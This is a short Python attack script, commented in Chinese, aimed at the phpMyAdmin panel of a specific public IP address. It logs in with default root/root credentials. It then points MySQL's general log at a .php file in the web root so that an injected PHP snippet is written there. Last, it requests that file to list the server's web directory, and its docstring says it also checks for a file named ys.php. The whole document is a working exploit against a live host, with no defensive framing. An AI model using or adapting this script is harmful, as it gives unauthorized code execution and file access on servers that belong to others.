#!/usr/bin/env python3
"""用内嵌PHP列目录 + 检查 ys.php 是否存在"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 列 WWW 目录
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tls.php'")
sql("SET GLOBAL general_log = 'ON'")
sql("SELECT '<?php echo \"FILES:\" . implode(\",\", glob(\"C:/phpStudy/WWW/*\"));?>'")
sql("SET GLOBAL general_log = 'OFF'")
time.sleep(1)
import urllib.request as ur
rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/tls.php", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
body = rr.read().decode("utf-8","ignore")
for line in body.split("\n"):
    if "Query\tSELECT" in line and "glob" not in line and "general_log" not in line:
        print("WWW目录:", line.strip()[line.find("SELECT"):][:300])
